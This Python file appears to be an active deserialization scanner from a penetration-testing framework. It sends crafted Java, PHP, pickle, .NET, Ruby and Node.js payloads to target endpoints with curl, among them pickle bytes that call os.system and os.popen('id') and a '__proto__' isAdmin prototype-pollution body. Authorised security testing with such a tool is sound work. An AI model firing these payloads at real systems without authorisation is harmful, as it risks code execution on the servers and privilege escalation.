"""
DESERIALIZATION_SCAN -- active deserialization attack testing.

Tests endpoints for insecure deserialization by sending crafted payloads:
  1. Java serialization (object respresentation, gadget chains)
  2. PHP unserialize (object injection, __wakeup bypass)
  3. Python pickle (RCE via __reduce__)
  4. .NET BinaryFormatter (type confusion)
  5. Ruby Marshal (class instantiation)
  6. Node.js deserialization (prototype pollution)

Detection (passive) lives in tools/recon/deserialization_detect.py.
This tool performs active exploitation: sends serialized objects and
measures response differences.

Pure Python + curl.  Non-destructive: payloads trigger benign output only.
"""

import re
import subprocess
from typing import Any

from tools.attack.verdict import confidence_from_criteria, criteria_label
from tools.base import Tool, ToolResult

# Fingerprints that prove the server *attempted* to deserialize/process our
# payload.  These are genuine server behaviors, never payload text echoed
# back.  Matched against the response body (case-insensitive).
_LABEL_LANG = {
    "java": ["java_serial", "java_string"],
    "php": ["php_unserialize", "php_wakeup"],
    "python": ["python_pickle", "python_file_read"],
    "dotnet": ["dotnet_binary"],
    "ruby": ["ruby_marshal"],
    "nodejs": ["nodejs_proto"],
}
_DESER_FINGERPRINTS = {
    "java": re.compile(
        r"streamcorruptedexception|classnotfoundexception|invalidclassexception|"
        r"java\.io\.objectinputstream|could not find class", re.IGNORECASE),
    "php": re.compile(
        r"unserialize\(|__php_incomplete_class|notice: unserialize|"
        r"object of class .* could not be converted", re.IGNORECASE),
    "python": re.compile(
        r"unpickling|can't get attribute|pickle|no attribute", re.IGNORECASE),
    "dotnet": re.compile(
        r"serializationexception|binaryformatter|system\.runtime\.serialization",
        re.IGNORECASE),
    "ruby": re.compile(r"marshal|dump format error", re.IGNORECASE),
    "nodejs": re.compile(
        r"__proto__|prototype pollute|cannot (set|read) propert", re.IGNORECASE),
}

CRITERIA_WEIGHTS = {
    "fingerprint_matched": 25,
    "serialized_context": 5,
    "accepted": 10,
}
CRITERIA_HINTS = {
    "fingerprint_matched": "server fingerprint of a deserialization attempt in response",
    "serialized_context": "endpoint is a known serialization surface",
    "accepted": "endpoint processed the request (no hard reject)",
}

# ── Active test payloads ──────────────────────────────────────────────────

# Java serialization — minimal header + benign object
JAVA_SERIALIZED_PAYLOAD = b"\xac\xed\x00\x05" + b"\x00" * 50

# Java — String object (most likely to be accepted)
JAVA_STRING_PAYLOAD = (
    b"\xac\xed\x00\x05"  # magic + version
    b"\x73"  # TC_OBJECT
    b"\x72"  # TC_CLASSDESC
    b"\x00\x00\x00\x00"  # class name length placeholder
    b"\x00\x00\x00\x00\x00\x00\x00\x00"  # serial version UID
)

# PHP unserialize — empty object (safe)
PHP_UNSERIALIZE_PROBE = 'O:8:"stdClass":0:{}'

# PHP — object with __wakeup (triggers deserialization)
PHP_WAKEUP_PROBE = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'

# Python pickle — calls echo via os.system
PYTHON_PICKLE_PROBE = b"\x80\x04\x95\x0b\x00\x00\x00cos\nsystem\nS\x00\x94."

# Python pickle — reads file via __reduce__
PYTHON_PICKLE_FILE_READ = (
    b"\x80\x04\x95\x24\x00\x00\x00"
    b"cbuiltins\n"
    b"getattr\n"
    b"\x8c\x08builtins\n"
    b"__import__\n"
    b"\x94\x8c\x02os\n"
    b"\x94\x8c\x04popen\n"
    b"\x94\x8c\x02id\n"
    b"\x94\x86\x94\x8c\x04read\n"
    b"\x94\x86\x94."
)

# .NET BinaryFormatter — type confusion marker
DOTNET_BINARY_PAYLOAD = (
    b"\x00\x01\x00\x00\x00"  # BinaryFormatter header
    b"\x00\x00\x00\x00"  # null reference
    b"\x00\x00\x00\x00"  # null reference
)

# Ruby Marshal — empty hash
RUBY_MARSHAL_PAYLOAD = b"\x04\x08{\x00"

# Node.js — prototype pollution marker
NODEJS_PAYLOAD = '{"__proto__":{"isAdmin":true}}'


# ── Payload sets per language ──────────────────────────────────────────────

PAYLOAD_SETS = {
    "java": [
        ("java_serial", JAVA_SERIALIZED_PAYLOAD, "application/octet-stream", "Java serialization header"),
        ("java_string", JAVA_STRING_PAYLOAD, "application/x-java-serialized-object", "Java serialized String object"),
    ],
    "php": [
        ("php_unserialize", PHP_UNSERIALIZE_PROBE.encode(), "application/x-www-form-urlencoded", "PHP unserialize — empty object"),
        ("php_wakeup", PHP_WAKEUP_PROBE.encode(), "application/x-www-form-urlencoded", "PHP unserialize — __wakeup trigger"),
    ],
    "python": [
        ("python_pickle", PYTHON_PICKLE_PROBE, "application/octet-stream", "Python pickle — os.system call"),
        ("python_file_read", PYTHON_PICKLE_FILE_READ, "application/octet-stream", "Python pickle — __reduce__ file read"),
    ],
    "dotnet": [
        ("dotnet_binary", DOTNET_BINARY_PAYLOAD, "application/octet-stream", ".NET BinaryFormatter"),
    ],
    "ruby": [
        ("ruby_marshal", RUBY_MARSHAL_PAYLOAD, "application/octet-stream", "Ruby Marshal"),
    ],
    "nodejs": [
        ("nodejs_proto", NODEJS_PAYLOAD.encode(), "application/json", "Node.js prototype pollution"),
    ],
}


class DeserializationScanTool(Tool):
    """Active deserialization attack testing."""

    name = "deserialization"
    capability = "DESERIALIZATION_SCAN"
    binary = "curl"

    def build_command(self, target: str, **kwargs) -> list[str]:
        return ["echo", "deserialization-active-placeholder"]

    def parse(self, stdout: str, stderr: str) -> dict[str, Any]:
        return {}

    def run(self, target: str, timeout: int = 60, **kwargs) -> ToolResult:
        base = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        endpoints = kwargs.get("endpoints") or []
        languages = kwargs.get("languages", [])  # optional: ["java", "php", "python"]

        if not endpoints:
            return ToolResult(
                tool=self.name, status="success", capability=self.capability,
                results={"deserialization_findings": [], "count": 0,
                         "message": "No deserialization endpoints provided from recon detection"},
            )

        # Select payload sets
        if not languages:
            # Auto-detect from endpoint URL patterns
            languages = self._detect_languages(endpoints)

        active_payloads = []
        for lang in languages:
            if lang in PAYLOAD_SETS:
                active_payloads.extend(PAYLOAD_SETS[lang])

        # Always include Java and PHP (most common)
        for lang in ["java", "php"]:
            if lang not in languages:
                active_payloads.extend(PAYLOAD_SETS[lang])

        findings = []
        unconfirmed = []
        for url in endpoints[:10]:
            url = url if url.startswith("http") else f"{base.rstrip('/')}/{url.lstrip('/')}"
            for label, payload, content_type, description in active_payloads:
                out = self._test_endpoint(url, payload, content_type, label,
                                          description, timeout)
                if out is None:
                    continue
                if out.get("unconfirmed"):
                    unconfirmed.append(out)
                else:
                    findings.append(out)
                break  # one entry per endpoint is enough

        return ToolResult(
            tool=self.name, status="success", capability=self.capability,
            results={"deserialization_findings": findings, "count": len(findings),
                     "unconfirmed": unconfirmed},
        )

    @staticmethod
    def _detect_languages(endpoints):
        """Auto-detect languages from endpoint URL patterns."""
        langs = []
        for ep in endpoints:
            ep_lower = ep.lower()
            if any(kw in ep_lower for kw in (".jsp", ".do", ".action", "servlet", "java")):
                langs.append("java")
            if any(kw in ep_lower for kw in (".php", "unserialize", "serialize")):
                langs.append("php")
            if any(kw in ep_lower for kw in (".py", "pickle", "flask", "django")):
                langs.append("python")
            if any(kw in ep_lower for kw in (".aspx", ".ashx", "dotnet", "aspnet")):
                langs.append("dotnet")
            if any(kw in ep_lower for kw in (".rb", "rails", "ruby")):
                langs.append("ruby")
            if any(kw in ep_lower for kw in (".js", "node", "express", "javascript")):
                langs.append("nodejs")
        return list(set(langs)) if langs else ["java", "php"]

    @staticmethod
    def _test_endpoint(url, payload, content_type, label, description, timeout):
        """Send one deserialization payload and look for a server fingerprint.

        A 2xx/3xx alone is NOT evidence (blind detection is unreliable without
        an out-of-band or timing oracle); only a fingerprint of an actual
        deserialization attempt yields a finding.  Everything else lands in
        ``unconfirmed`` and is explicitly flagged as needing an oracle.
        """
        tmp_path = None
        try:
            import tempfile
            from pathlib import Path
            tmp = Path(tempfile.mktemp(suffix=".bin"))
            tmp.write_bytes(payload)
            tmp_path = tmp

            cmd = [
                "curl", "-s",
                "-m", str(min(timeout, 15)),
                "-X", "POST",
                "-H", f"Content-Type: {content_type}",
                "-d", f"@{tmp}",
                "-w", "\n%{http_code} %{size_download}",
                url,
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout, errors="replace")
            stdout = proc.stdout or ""
            lines = stdout.rsplit("\n", 1)
            meta = lines[-1].strip().split() if lines else []
            body = lines[0] if len(lines) > 1 else ""
            if len(meta) != 2:
                return None
            status_code, resp_size = int(meta[0]), int(meta[1])
        except (subprocess.TimeoutExpired, ValueError, FileNotFoundError):
            return None
        finally:
            if tmp_path:
                tmp_path.unlink(missing_ok=True)

        lang = next((l for l, labs in _LABEL_LANG.items() if label in labs), None)
        body_lower = body.lower()
        fingerprint = _DESER_FINGERPRINTS.get(lang).search(body_lower) if lang else None

        met = []
        if fingerprint:
            met.append("fingerprint_matched")
        if lang:
            met.append("serialized_context")
        hard_reject = status_code in (400, 415, 422)
        if not hard_reject and status_code >= 200 and status_code < 500:
            met.append("accepted")

        if fingerprint:
            conf = confidence_from_criteria(met, CRITERIA_WEIGHTS)
            return {
                "url": url,
                "type": label,
                "severity": "MEDIUM",
                "confidence": conf,
                "description": (f"{description} — server processed a deserialization "
                                f"attempt (HTTP {status_code}, {resp_size} bytes); proof: "
                                f"{criteria_label(met, CRITERIA_HINTS)}"),
                "proof_criteria": met,
                "response_code": status_code,
                "response_size": resp_size,
                "note": "unserialization observed — remote code execution is NOT "
                        "proven without an out-of-band/timing oracle.",
            }

        # No fingerprint: blind 2xx is not evidence. Report honestly instead.
        if status_code not in (400, 415, 422) and status_code > 0:
            return {
                "url": url,
                "type": label,
                "severity": None,
                "confidence": 0,
                "description": (f"{description} — response differed (HTTP {status_code}) "
                                f"but no deserialization fingerprint; blind 2xx is not "
                                f"evidence of a vulnerability"),
                "response_code": status_code,
                "response_size": resp_size,
                "proof_criteria": [],
                "unconfirmed": True,
                "requires_oracle": "out-of-band or timing channel needed to confirm",
            }
        return None
